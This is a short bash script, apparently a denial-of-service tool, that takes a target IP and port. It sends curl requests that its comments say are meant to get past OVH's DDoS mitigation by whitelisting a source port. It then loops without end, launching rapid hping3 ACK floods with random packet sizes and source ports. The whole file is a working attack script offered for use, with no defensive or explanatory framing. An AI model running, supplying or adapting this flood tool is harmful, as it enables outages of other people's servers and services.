if [ "$#" -lt 2 ]; then
    echo "Usage: ./script.sh <ip> <port> [delay]"
    exit
fi
pkill -9 curl
srcprt=$(shuf -i 20000-50000 -n 1)
dstprt=$2
delay=$3
# If we don't have a delay set we will use 0.5
if [ -z "$3" ]
  then
    delay=0.5
fi
echo "Using delay of $delay"
# Whitelist attempts
curl $1:$2 &
sleep $delay
curl $1:$2 &
sleep $delay
curl $1:$2 &
sleep $delay
# Source port defined here so OVH remembers what port we will be sending data over
curl --local-port $srcprt $1:$2 &
sleep $delay
# Chose packet length
         COUNTER=2
         until [  $COUNTER -lt 1 ]; do
              srcprt=$(shuf -i 20000-50000 -n 1)
              curl --local-port $srcprt $1:$2 </dev/null &>/dev/null &
              len=$(shuf -i 500-1100 -n 1)
              hping3 -i u1 -q -s $srcprt --keep -d $len -A -p $2 -w 192 -E data $1 </dev/null &>/dev/null &
              sleep 0.5
              pkill "hping3 -i u1 -q -s $srcprt --keep -d $len -A -p $2 -w 192 -E data $1" -f
             let COUNTER+=1
         done
